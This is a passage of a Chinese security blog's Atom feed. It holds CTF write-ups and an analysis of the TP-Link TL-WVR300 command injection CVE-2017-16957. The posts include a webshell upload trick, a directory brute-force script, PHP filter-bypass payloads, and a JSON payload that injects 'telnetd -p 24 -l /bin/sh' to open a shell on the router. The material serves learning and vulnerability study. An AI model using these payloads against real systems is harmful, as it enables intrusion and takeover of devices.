<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>leesinc1&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-03T09:23:55.188Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>leesinc1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>既然选择了便要风雨兼程</title>
    <link href="http://yoursite.com/2018/05/01/%E6%97%A2%E7%84%B6%E9%80%89%E6%8B%A9%E4%BA%86%E4%BE%BF%E8%A6%81%E9%A3%8E%E9%9B%A8%E5%85%BC%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/05/01/既然选择了便要风雨兼程/</id>
    <published>2018-05-01T05:02:14.000Z</published>
    <updated>2018-05-03T09:23:55.188Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="其他" scheme="http://yoursite.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>记XCTF-HITB一道题</title>
    <link href="http://yoursite.com/2018/04/14/%E8%AE%B0XCTF-HITB%E4%B8%80%E9%81%93%E9%A2%98/"/>
    <id>http://yoursite.com/2018/04/14/记XCTF-HITB一道题/</id>
    <published>2018-04-14T07:12:04.000Z</published>
    <updated>2018-04-19T08:52:38.438Z</updated>
    
    <content type="html"><![CDATA[<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.90.97.18:9999/</div></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在源码里面发现pic.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.90.97.18:9999/pic.php?filename=default.jpg</div></pre></td></tr></table></figure></p><p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">width=497</div><div class="line">height=477</div></pre></td></tr></table></figure></p><p>然后尝试文件包含，全是返回image error</p><p>在文件上传页面上传文件后抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Server: Microsoft-IIS/7.0</div></pre></td></tr></table></figure></p><p>发现服务器不是linux而是windows</p><p>写个一句话木马，上传1.php，抓包后改为1.php(空格)，由于windows系统的原因最后会变成1.php</p><p>成功之后发现文件路径不知道无法读取文件,然后百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.moonsec.com/post-304.html</div></pre></td></tr></table></figure></p><p>写到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">已知1.php存在，以上脚本访问的结果是：</div><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div><div class="line">都能得到返回。</div></pre></td></tr></table></figure></p><blockquote><p>、&lt;可以进行通配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/column/164698.html</div></pre></td></tr></table></figure></p></blockquote><p>文章提到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PHP语言某些函数就在Windows系统上拥有了如下奇妙的特性：</div><div class="line">大于号(&gt;)相等于通配符问号(?)</div><div class="line"></div><div class="line">小于号(&lt;)相当于通配符星号(*)</div><div class="line"></div><div class="line">双引号(&quot;)相当于点字符(.)</div></pre></td></tr></table></figure></p><p>以及getimagesiz()函数使用时的一些问题，并且通过两个例子，说明了可以使用通配来进行目录爆破</p><p>先尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?filename=../a&lt;/default.jpg</div></pre></td></tr></table></figure></p><p>有回显，说明可以进行爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import requests</div><div class="line">url = &quot;http://47.90.97.18:9999/pic.php?filename=../&quot;</div><div class="line">ans = &quot;&quot;</div><div class="line">for i in range(1,100):</div><div class="line">    for j in &apos;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;:</div><div class="line">        url1 = url+ans+j+&apos;&lt;/default.jpg&apos;</div><div class="line">        r = requests.get(url=url1)</div><div class="line">        if &quot;height&quot; in r.content:</div><div class="line">            ans +=j</div><div class="line">            break</div><div class="line">print ans</div></pre></td></tr></table></figure></p><p>得到目录后，使用菜刀连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;地址&quot;&gt;&lt;a href=&quot;#地址&quot; class=&quot;headerlink&quot; title=&quot;地址&quot;&gt;&lt;/a&gt;地址&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div c
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link路由器任意命令注入漏洞分析</title>
    <link href="http://yoursite.com/2018/04/01/TP-Link%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/04/01/TP-Link路由器任意命令注入漏洞分析/</id>
    <published>2018-04-01T09:53:00.000Z</published>
    <updated>2018-04-09T02:49:32.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>路由器型号：TL-WVR300</p><p>kali linux 2018.1</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>TP-Link TL-WVR 等都是中国普联（TP-LINK）公司的无线路由器产品。<br>多款 TP-Link 系列产品存在命令注入漏洞，攻击者在登录后可发送恶意字段，经拼接后导致任意命令执行。影响版本比较广泛。<br>漏洞编号：CVE-2017-16957</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>先从TP-Link官网下载TL-WVR300的压缩包。</p><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">下载地址</a><br>解压后，使用binwalk命令对<strong>TL-WVR300v4_cn<em>2.0.0</em>[20161130-rel60987]_up.bin</strong>进行解包。<br>漏洞文件路径：<strong><em>/usr/lib/lua/luci/controller/admin/diagnostic.lua</em></strong></p><p>打开diagnostic.lua。在第89行,把参数t拼接到cmd，再通过<strong>local ff = io.popen(cmd, “r”);</strong>进行命令执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">local function zone_get_effect_devices(t)</div><div class="line">    local devices </div><div class="line"></div><div class="line">    local cmd = &quot;. /lib/zone/zone_api.sh; zone_get_effect_devices &quot; .. t</div><div class="line">dbg(&quot;cmd:&quot;,cmd)</div><div class="line">    local ff = io.popen(cmd, &quot;r&quot;);</div><div class="line">    if not ff then</div><div class="line">        return devices</div><div class="line">    end</div><div class="line"></div><div class="line">    local l = ff:read(&quot;*l&quot;)</div><div class="line">    return l</div><div class="line">end</div></pre></td></tr></table></figure></p><p>根据以往的经验，注入类漏洞产生的原因大多是没有对用户可控的输入进行过滤，那么我们往下看到底有没有对输入进行过滤。</p><p>在代码中找到调用<strong>zone_get_effect_devices</strong>的函数<strong>ping_action</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">local function ping_action(http_form)</div><div class="line">    local uci_r = uci.cursor()</div><div class="line">    local form_data = json.decode(http_form.data)</div><div class="line">    local params = form_data.params</div><div class="line"></div><div class="line">    local types      = params[&quot;type&quot;] or &quot;&quot;</div><div class="line">    local my_ip      = params[&quot;ipaddr&quot;] or &quot;&quot;</div><div class="line">local my_init_ip = params[&quot;ipaddr&quot;] or &quot;&quot;</div><div class="line">    local my_count   = params[&quot;count&quot;] or &quot;&quot;</div><div class="line">    local my_pkt     = params[&quot;pktsize&quot;] or &quot;&quot;</div><div class="line">    local my_timeout = params[&quot;timeout&quot;] or &quot;&quot;</div><div class="line">    local my_ttl     = uci_r:get(&quot;diagnostic&quot;, &quot;params&quot;, &quot;ttl&quot;) or 20</div><div class="line">    local my_result  = &quot; &quot;</div><div class="line">local my_iface   = params[&quot;iface&quot;] or &quot;&quot;</div><div class="line">local my_dev   = my_iface</div><div class="line">local my_iface2  = my_iface</div><div class="line"></div><div class="line">local is_self_ip=check_self_ip(my_ip)</div><div class="line"></div><div class="line">dbg(&quot;my_iface:&quot;,my_iface)</div><div class="line">my_iface = zone_get_effect_devices(my_iface)</div><div class="line">dbg(&quot;my_iface:&quot;,my_iface)</div><div class="line">dbg(&quot;my_dev:&quot;,my_dev)</div><div class="line">    ...</div></pre></td></tr></table></figure></p><p>可以看到参数<strong>http_form</strong>进行json解析后，把json参数<strong>params.iface</strong>赋给<strong>my_iface</strong>再传入<strong>zone_get_effect_devices</strong>。这个过程中并未对http_form参数进行敏感字段过滤。<br>再往下找到调用<strong>ping_action</strong>的函数<strong>start_action</strong>(大概在403行)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">local function start_action(http_form)</div><div class="line">    local form_data = json.decode(http_form.data)</div><div class="line">    local params = form_data.params</div><div class="line">    local types = params.type or &quot;&quot;</div><div class="line">    </div><div class="line">    local ret</div><div class="line">    if types == &quot;0&quot; then</div><div class="line">    dbg(&quot;ping begin!&quot;)</div><div class="line">        ret = ping_action(http_form)</div><div class="line">    elseif types == &quot;1&quot; then</div><div class="line">    dbg(&quot;troute begin!&quot;)</div><div class="line">        ret = trace_action(http_form)</div><div class="line">    end</div><div class="line"></div><div class="line">    return ret or false</div><div class="line"></div><div class="line">end</div></pre></td></tr></table></figure></p><p>可以看到这个过程也没有对<strong>http_form</strong>进行安全检测。再往下找到调用<strong>start_action</strong>的地方(代码最下面)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">local dispatch_tbl = &#123;</div><div class="line">    diag = &#123;</div><div class="line">        [&quot;start&quot;]    = &#123;cb = start_action&#125;,</div><div class="line">        [&quot;stop&quot;]     = &#123;cb = stop_action&#125;,</div><div class="line">        [&quot;get&quot;]     = &#123;cb = get_default_value&#125;,</div><div class="line">        [&quot;continue&quot;] = &#123;cb = continue_action&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>调用之前也没有做任何检测。所以结合分析，使用<strong>start_action</strong>函数来检测系统的网络连接，再执行这个操作的过程对于参数没有做任何检查，导致命令拼接之后实现命令注入漏洞。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>可以构造如下json编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;method&quot;:&quot;start&quot;,</div><div class="line">    &quot;params&quot;:&#123;</div><div class="line">        &quot;type&quot;:&quot;0&quot;,</div><div class="line">        &quot;type_hidden&quot;:&quot;0&quot;,</div><div class="line">        &quot;ipaddr_ping&quot;:&quot;127.0.0.1&quot;,</div><div class="line">        &quot;iface_ping&quot;:&quot;WAN1&quot;,</div><div class="line">        &quot;ipaddr&quot;:&quot;127.0.0.1&quot;,</div><div class="line">        &quot;iface&quot;:&quot;;shellcode&quot;,</div><div class="line">        &quot;count&quot;:&quot;1&quot;,</div><div class="line">        &quot;pktsize&quot;:&quot;64&quot;,</div><div class="line">        &quot;my_result&quot;:&quot;exploit&quot;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>可以改变如上代码中，iface字段shellcode的内容,比如<strong>telnetd -p 24 -l /bin/sh</strong>,web登录认证以后，发送payload，路由器会执行上述命令，然后打开路由器的telent功能，之后你就能为所欲为了。</p><p>全局搜索<strong>io.popen</strong>后发现漏洞不止一处<br><img src="/uploads/iopopen.png" alt="io.popen"><br>发现很多类似上述的代码段，直接拼接命令后直接执行，这是非常危险的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;路由器型号：TL-WVR300&lt;/p&gt;
&lt;p&gt;kali linux 2018.1&lt;/p&gt;
&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="命令注入" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>solveme web writeup</title>
    <link href="http://yoursite.com/2018/03/19/solveme-web-writeup/"/>
    <id>http://yoursite.com/2018/03/19/solveme-web-writeup/</id>
    <published>2018-03-19T14:35:08.000Z</published>
    <updated>2018-03-19T14:40:48.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><p>反解回去就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$str1 = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</div><div class="line">echo hex2bin(strrev(bin2hex(base64_decode($str1))));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><h2 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   error_reporting(0);</div><div class="line">   require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">   if(isset($_GET[&apos;answer&apos;]))&#123;</div><div class="line"></div><div class="line">       if($_GET[&apos;answer&apos;] === &apos;xxxxxxx&apos;)&#123;</div><div class="line">           echo $flag;</div><div class="line">       &#125;else&#123;</div><div class="line">           echo &apos;Wrong answer&apos;;</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       echo &apos;&lt;hr&gt;&apos;;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>要求answer等于一串乱码，直接把乱码get上去肯定死不行的，抓个包把乱码的十六进制传送上去得到flag.</p><h2 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   error_reporting(0);</div><div class="line">   require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">   if(isset($_GET[&apos;time&apos;]))&#123;</div><div class="line"></div><div class="line">       if(!is_numeric($_GET[&apos;time&apos;]))&#123;</div><div class="line">           echo &apos;The time must be number.&apos;;</div><div class="line"></div><div class="line">       &#125;else if($_GET[&apos;time&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</div><div class="line">           echo &apos;This time is too short.&apos;;</div><div class="line"></div><div class="line">       &#125;else if($_GET[&apos;time&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</div><div class="line">           echo &apos;This time is too long.&apos;;</div><div class="line"></div><div class="line">       &#125;else&#123;</div><div class="line">           sleep((int)$_GET[&apos;time&apos;]);</div><div class="line">           echo $flag;</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       echo &apos;&lt;hr&gt;&apos;;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>要求上传一个time，大小在两到三个月之间，然后强制转为整形后，执行sleep()函数，最后输出flag，如果正常传入一个满足两个else if条件的整数显然flag不会立马出来，谷歌一波发现科学计数法在强制转为int类型时有漏洞，比如77e88,int(77e88)-&gt;77,也就是说只会把e前面的数强制转换位整形，那就很显然出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?time=6e6</div></pre></td></tr></table></figure></p><h2 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   error_reporting(0);</div><div class="line">   session_start();</div><div class="line">   require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">   if(isset($_GET[&apos;username&apos;], $_GET[&apos;password&apos;]))&#123;</div><div class="line"></div><div class="line">       if(isset($_SESSION[&apos;hard_login_check&apos;]))&#123;</div><div class="line">           echo &apos;Already logged in..&apos;;</div><div class="line"></div><div class="line">       &#125;else if(!isset($_GET[&apos;username&apos;]&#123;3&#125;) || strtolower($_GET[&apos;username&apos;]) != $hidden_username)&#123;</div><div class="line">           echo &apos;Wrong username..&apos;;</div><div class="line"></div><div class="line">       &#125;else if(!isset($_GET[&apos;password&apos;]&#123;7&#125;) || $_GET[&apos;password&apos;] != $hidden_password)&#123;</div><div class="line">           echo &apos;Wrong password..&apos;;</div><div class="line"></div><div class="line">       &#125;else&#123;</div><div class="line">           $_SESSION[&apos;hard_login_check&apos;] = true;</div><div class="line">           echo &apos;Login success!&apos;;</div><div class="line">           header(&apos;Location: ./&apos;);</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       echo &apos;&lt;hr&gt;&apos;;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>试试弱口令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?username=admin&amp;password=2333</div></pre></td></tr></table></figure></p><p>提示密码错误，可能需要爆破，用bp爆破后没有结果，后来发现index.php,抓包后发现flag.</p><h2 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   error_reporting(0);</div><div class="line">   require __DIR__.&quot;/lib.php&quot;;</div><div class="line"></div><div class="line">   $url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]);</div><div class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</div><div class="line"></div><div class="line">   $params = explode(&quot;&amp;&quot;, $url_query);</div><div class="line">   foreach($params as $param)&#123;</div><div class="line"></div><div class="line">       $idx_equal = strpos($param, &quot;=&quot;);</div><div class="line">       if($idx_equal === false)&#123;</div><div class="line">           $key = $param;</div><div class="line">           $value = &quot;&quot;;</div><div class="line">       &#125;else&#123;</div><div class="line">           $key = substr($param, 0, $idx_equal);</div><div class="line">           $value = substr($param, $idx_equal + 1);</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       if(strpos($key, &quot;do_you_want_flag&quot;) !== false || strpos($value, &quot;yes&quot;) !== false)&#123;</div><div class="line">           die(&quot;no hack&quot;);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</div><div class="line">       die($flag);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>一下就看到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]);</div><div class="line">$url_query = parse_url($url, PHP_URL_QUERY);</div></pre></td></tr></table></figure></p><p>parse_url()遇到几次了，有时间得总结一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://urlfiltering.solveme.peng.kr///index.php?do_you_want_flag=yes</div></pre></td></tr></table></figure></p><h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    if(isset($_GET[&apos;foo&apos;], $_GET[&apos;bar&apos;]))&#123;</div><div class="line"></div><div class="line">        if(strlen($_GET[&apos;foo&apos;]) &gt; 30 || strlen($_GET[&apos;bar&apos;]) &gt; 30)&#123;</div><div class="line">            die(&apos;Too long&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if($_GET[&apos;foo&apos;] === $_GET[&apos;bar&apos;])&#123;</div><div class="line">            die(&apos;Same value&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if(hash(&apos;sha512&apos;, $_GET[&apos;foo&apos;]) !== hash(&apos;sha512&apos;, $_GET[&apos;bar&apos;]))&#123;</div><div class="line">            die(&apos;Different hash&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(hash(&apos;sha512&apos;, $_GET[&apos;foo&apos;]) !== hash(&apos;sha512&apos;, $_GET[&apos;bar&apos;]))</div></pre></td></tr></table></figure></p><p>要求$foo和$bar两个变量不相同，但hash()函数的值要相同，hash()函数在处理数组时会返回false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?foo[]=a&amp;bar[]=b</div></pre></td></tr></table></figure></p><h2 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   error_reporting(0);</div><div class="line">   require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">   if(isset($_GET[&apos;say&apos;]) &amp;&amp; strlen($_GET[&apos;say&apos;]) &lt; 20)&#123;</div><div class="line"></div><div class="line">       $say = preg_replace(&apos;/^(.*)flag(.*)$/&apos;, &apos;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&apos;, $_GET[&apos;say&apos;]);</div><div class="line"></div><div class="line">       if(preg_match(&apos;/give_me_the_flag/&apos;, $say))&#123;</div><div class="line">           echo $flag;</div><div class="line">       &#125;else&#123;</div><div class="line">           echo &apos;What the f**k?&apos;;</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       echo &apos;&lt;hr&gt;&apos;;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   highlight_file(__FILE__);</div></pre></td></tr></table></figure><p>flag会被替换为空，双写的话长度不满足，用%0a尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?say=give_me_the_fl%0aag</div></pre></td></tr></table></figure></p><p>没有输出flag，本地尝试后发现绕过了第一个正则匹配，在第二正则匹配是匹配不到字符串，于是把%0a放前面，出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?say=%0agive_me_the_flag</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerlink&quot; title=&quot;Warm up&quot;&gt;&lt;/a&gt;Warm up&lt;/h2&gt;&lt;p&gt;反解回去就可以了&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>杂谈</title>
    <link href="http://yoursite.com/2018/03/14/%E6%9D%82%E8%B0%88/"/>
    <id>http://yoursite.com/2018/03/14/杂谈/</id>
    <published>2018-03-14T08:39:27.000Z</published>
    <updated>2018-03-14T10:06:26.887Z</updated>
    
